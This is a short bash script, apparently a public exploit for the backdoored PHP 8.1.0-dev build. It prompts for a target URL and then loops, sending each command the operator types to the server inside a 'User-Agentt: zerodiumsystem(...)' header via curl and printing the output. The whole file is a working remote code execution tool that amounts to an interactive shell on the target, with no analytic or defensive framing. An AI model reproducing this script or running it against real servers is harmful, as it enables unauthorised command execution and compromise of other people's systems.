#!/bin/bash

# PHP 8.1.0-dev RCE 'User-Agentt'
# Uppon execution give the vulnerable host URL and the command to be executed after the '$'
# If the exploit is executed succesfully you'll receive the output
# If not you'll receive a blank page

read -p "Vulnerable Server URL: " host


while true
do
        read -p "$ " cmd
        curl $host -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0" -H "User-Agentt: zerodiumsystem(\"$cmd\");" -s | sed '/<!DOCTYPE/q' | sed '/<!DOCTYPE/d'

        if [ $cmd = 'exit' ]; then
                exit 1
        fi

done
